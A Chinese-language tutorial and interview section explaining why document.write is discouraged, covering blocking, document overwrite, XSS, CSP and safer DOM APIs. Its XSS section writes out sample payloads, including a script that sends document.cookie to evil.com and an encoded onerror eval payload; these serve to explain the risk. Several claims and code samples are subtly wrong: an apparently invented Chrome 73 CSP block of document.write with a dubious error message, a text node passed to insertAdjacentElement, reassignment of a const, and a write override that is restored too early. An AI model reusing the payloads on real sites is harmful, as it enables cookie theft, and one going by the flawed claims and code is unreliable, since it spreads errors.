# Section 21: document.write 为什么不推荐

## 一、document.write 的工作机制

`document.write()` 是 DOM Level 0 的老牌 API，直接将字符串写入当前文档解析流（parser stream）。

```javascript
// 基础用法
document.write('<p>Hello World</p>');

// 内部等价于：
document.open();     // 打开新文档流（若文档已关闭则清空已有内容）
document.write('<p>Hello World</p>');
document.close();    // 通知解析器文档结束
```

**关键点**：在 HTML 解析过程中调用，文档流处于打开状态，`write()` 追加内容；在文档解析完成后调用（隐式 `document.open()`），会**清空整个文档**。

---

## 二、四大致命问题

### 2.1 问题一：同步阻塞（Synchronous Blocking）

`document.write()` 是同步执行，会**阻塞 HTML 解析器**：

```html
<!-- 问题场景：第三方脚本响应慢 -->
<script src="https://slow-cdn.com/ads.js"></script>
<!-- 浏览器在脚本执行完毕前，无法解析和渲染页面任何部分 -->
<p>这段文字在 write 完成前无法渲染</p>
```

**浏览器处理流程**：

```
HTML Parser
    ↓ 遇到 <script>
    ↓ 暂停 HTML 解析
    ↓ 执行 JavaScript（含 document.write）
    ↓ write() 同步将内容写入文档流
    ↓ 解析器继续解析新写入的内容
    ↓ 解析器恢复，解析后续 HTML
    ↓ Render Tree → Layout → Paint
```

**危害**：
- 脚本执行期间，浏览器无法渲染页面任何部分，造成长时间白屏
- 现代前端要求的「渐进式渲染」「流式加载」完全无法实现
- 尤其对于第三方广告/追踪脚本，影响最为严重

### 2.2 问题二：覆盖已有文档（Overwrite）

这是 `document.write()` 最常见也最危险的陷阱：**在页面加载完成后调用会清空整个文档**。

```javascript
// ❌ DOMContentLoaded 后调用 document.write —— 整个页面内容消失！
document.addEventListener('DOMContentLoaded', () => {
  document.write('<h1>Oops! Everything is gone!</h1>');
  // 原有内容：导航、内容、脚本 —— 全部被清空！
});

// ✅ 正确做法：使用 innerHTML 或 createElement
document.addEventListener('DOMContentLoaded', () => {
  const h1 = document.createElement('h1');
  h1.textContent = 'Safe content';
  document.body.appendChild(h1);
});
```

### 2.3 问题三：XSS 安全风险

`document.write()` 是**XSS 攻击的温床**：

```javascript
// ❌ 最危险的写法：用户输入直接写入
const username = new URLSearchParams(location.search).get('name');
document.write('<h1>Welcome, ' + username + '</h1>');

// 攻击者构造 URL：
// ?name=<script>fetch('https://evil.com/steal?c='+document.cookie)</script>
// 或
// ?name=<img src=x onerror=eval(atob('ZmV0Y2goJ2V2aWwuY29tJylbcmVzdF0='))>

// ❌ 服务端示例（危险）：
// 后端直接输出用户搜索词
document.write('<div>Search: <%= request.getParameter("q") %></div>');
// 如果 q = '<script>alert(1)</script>' —— 脚本直接执行！
```

### 2.4 问题四：CSP 直接阻止

现代浏览器的 **Content Security Policy（CSP）** 会直接阻止 `document.write()`，这是 Chrome 73+（2019年3月）引入的自动防护：

```http
Content-Security-Policy: script-src 'self'
```

```javascript
// 被 CSP 阻止后：
document.write('<p>test</p>');
// 控制台错误：
// "An unbalanced tree write (or similar) operation was started
//  by a script that is not trusted by the Document Blocking CSP."
```

**触发条件**：
1. 脚本不是通过用户点击导航触发的
2. `document.write()` 写入的内容来自外部不受信任的来源
3. 页面设置了限制性的 CSP

**受影响最大的场景**：老旧广告联盟脚本、统计分析工具（仍在内部用 `document.write` 注入内容）。

---

## 三、`document.writeln` 边缘行为

`document.writeln()` = `document.write()` + 末尾自动添加 `\n`（换行符）。

```javascript
document.writeln('<p>Line 1</p>');
document.writeln('<p>Line 2</p>');
// 等价于：
document.write('<p>Line 1</p>\n');
document.write('<p>Line 2</p>\n');
```

**边缘问题**：

```javascript
// 1. 在 </html> 关闭之后调用 writeln，等同于 write，会清空文档
// 2. 在 XHTML 模式下，不允许未转义的换行符，可能导致解析错误
// 3. 在 <pre> 标签外，浏览器会忽略多余的换行符，行为与 write 几乎一样
```

---

## 四、现代替代方案

### 4.1 `innerHTML`（最常用）

适用于一次性插入一段 HTML 片段：

```javascript
const container = document.getElementById('content');

// ✅ innerHTML：直接替换容器内容
container.innerHTML = '<p>Hello <strong>World</strong></p>';

// ⚠️ innerHTML 同样有 XSS 风险，需要转义
function escapeHtml(str) {
  const div = document.createElement('div');
  div.textContent = str; // textContent 自动转义 HTML 特殊字符
  return div.innerHTML;
}
container.innerHTML = '<p>' + escapeHtml(userInput) + '</p>';
```

### 4.2 `createElement`（最安全）

适用于创建和配置单个或少量元素：

```javascript
// ✅ 安全方式：createElement + textContent
const p = document.createElement('p');
p.textContent = 'Hello World'; // 自动转义，无 XSS 风险
p.className = 'intro';
document.body.appendChild(p);

// ✅ 批量创建 DocumentFragment
const fragment = document.createDocumentFragment();
['item1', 'item2', 'item3'].forEach(text => {
  const li = document.createElement('li');
  li.textContent = text; // textContent 自动转义
  fragment.appendChild(li);
});
document.querySelector('ul').appendChild(fragment);
```

### 4.3 `insertAdjacentHTML`（最高效）

在不破坏现有元素的情况下，在指定位置插入：

```javascript
const target = document.getElementById('box');

target.insertAdjacentHTML('beforebegin', '<p>Before target</p>');
target.insertAdjacentHTML('afterbegin',  '<p>Inside target, first</p>');
target.insertAdjacentHTML('beforeend',   '<p>Inside target, last</p>');
target.insertAdjacentHTML('afterend',   '<p>After target</p>');
```

**`insertAdjacentHTML` vs `innerHTML`**：

| 维度 | `innerHTML` | `insertAdjacentHTML` |
|------|---|---|
| 位置 | 替换整个容器 | 在4个指定位置之一插入 |
| 性能 | 较低（需序列化已有内容） | 较高（直接操作 DOM 树） |
| 破坏性 | 有（销毁原有子元素的事件监听器） | 无（不重新解析已有内容） |

### 4.4 `textContent` vs `innerText`

```javascript
const div = document.createElement('div');

// textContent：纯文本，自动转义 HTML 特殊字符 ✅
div.textContent = '<script>alert(1)</script>';
// 结果：&lt;script&gt;alert(1)&lt;/script&gt; —— 安全！

// innerText：纯文本，受 CSS 影响（触发重排，性能差）
div.innerText = '<script>alert(1)</script>';
// 也输出纯文本，但性能差于 textContent
```

### 4.5 完整的「安全写入」工具函数

```javascript
function safeInsert(container, position, content, allowHtml = false) {
  if (allowHtml) {
    // 如果允许 HTML，必须使用 DOMPurify 等库净化
    const clean = DOMPurify.sanitize(content);
    container.insertAdjacentHTML(position, clean);
  } else {
    // 纯文本：用 createTextNode + insertAdjacentText
    const text = document.createTextNode(content);
    container.insertAdjacentElement(position, text);
  }
}
```

---

## 五、第三方脚本注入问题（广告、统计）

老旧第三方脚本使用 `document.write()`，会导致：阻塞加载、清空页面内容、触发 CSP 阻止。

**解决方案**：将同步 write 脚本转为异步加载：

```html
<!-- 方法 1：defer（最简单） -->
<script defer src="//ad-network.com/ads.js"></script>
<!-- defer 在 DOM 解析完成后、执行之前执行，不阻塞渲染 -->

<!-- 方法 2：覆盖 document.write（no-op） -->
<script>
(function() {
  const _write = document.write.bind(document);
  document.write = () => {}; // 阻止 write
  const script = document.createElement('script');
  script.src = '//ad-network.com/ads.js';
  script.async = true;
  document.head.appendChild(script);
  document.write = _write;
})();
</script>

<!-- 方法 3：sandbox iframe（最安全隔离） -->
<iframe sandbox="allow-scripts" srcdoc="
  <script src='//ad-network.com/ads.js'><\/script>
"></iframe>
<!-- write 操作只能在 iframe 内生效，不影响主页面 -->
```

---

## 六、面试follow-up questions

**Q1. 如果 CSP 设置为 `script-src 'self'`，用户通过 `?q=<script>alert(1)</script>` 注入内联脚本，攻击是否成功？**

攻击**不会成功**。CSP `script-src 'self'` 只允许同源脚本，内联脚本默认被阻止（除非设置 `'unsafe-inline'`）。

但如果服务端用 `document.write` 直接输出用户输入，则存在风险：

```javascript
// 服务端危险写法（Node.js/Express）
app.get('/search', (req, res) => {
  res.send(`<h1>Results for: ${req.query.q}</h1>`);
  // q = '<script>stealCookies()</script>' —— 反射型 XSS！
});
```

**正确做法**：服务端对所有用户输入进行 HTML 转义，或使用模板引擎（React/Angular/Vue 服务端渲染天然转义）。

---

**Q2. `innerHTML` 替换容器时，原有子元素的事件监听器会被保留还是泄漏？**

**都会导致泄漏和失效**。`innerHTML` 的机制是：先销毁所有子节点（包括事件监听器），再解析新 HTML 字符串创建新节点。原有事件监听器被销毁，但可能残留在闭包中造成内存泄漏。

**正确做法**：

```javascript
// ✅ 使用 DocumentFragment 批量移除（保留引用，不泄漏）
const fragment = document.createDocumentFragment();
while (container.firstChild) {
  fragment.appendChild(container.firstChild);
}
// container 为空，所有子节点转移到 fragment
fragment = null; // 用完后清空

// ✅ 或者逐个 remove（HTMLCollection 是 Live 的）
while (container.firstChild) {
  container.firstChild.remove();
}
```

---

**Q3. 有一个脚本在 `<head>` 中使用 `document.write` 加载第三方 JS，该脚本响应慢时会阻塞整个页面渲染。在不修改第三方脚本的前提下如何解决？**

核心策略：将同步 `document.write` 脚本转为**异步加载**：

```html
<!-- 方法 1：defer（最简单有效） -->
<script defer src="//third-party.com/slow.js"></script>

<!-- 方法 2：动态创建 script + 覆盖 write -->
<script>
(function() {
  const orig = document.write.bind(document);
  document.write = function() {}; // 阻止 write，或写入备用容器
  const script = document.createElement('script');
  script.src = '//third-party.com/slow.js';
  script.async = true;
  document.head.appendChild(script);
  document.write = orig;
})();
</script>

<!-- 方法 3：sandbox iframe（最安全，隔离执行） -->
<iframe sandbox="allow-scripts" srcdoc="
  <script src='//third-party.com/slow.js'><\/script>
"></iframe>

<!-- 方法 4：先加载页面主要资源，最后加载第三方脚本 -->
<script>
  // 核心内容加载完成后再加载
  requestIdleCallback(() => {
    const script = document.createElement('script');
    script.src = '//third-party.com/slow.js';
    script.async = true;
    document.body.appendChild(script);
  });
</script>
```

> 📚 参考：
> - [MDN: document.write()](https://developer.mozilla.org/zh-CN/docs/Web/API/Document/write)
> - [MDN: innerHTML](https://developer.mozilla.org/zh-CN/docs/Web/API/Element/innerHTML)
> - [MDN: insertAdjacentHTML](https://developer.mozilla.org/zh-CN/docs/Web/API/Element/insertAdjacentHTML)
> - [MDN: Content Security Policy (CSP)](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP)
> - [HTML Spec: Browsing contexts - document.open](https://html.spec.whatwg.org/multipage/dynamic-markup-insertion.html)
> - [Google Web Fundamentals: CSP](https://developers.google.com/web/fundamentals/security/csp)
> - [OWASP: XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
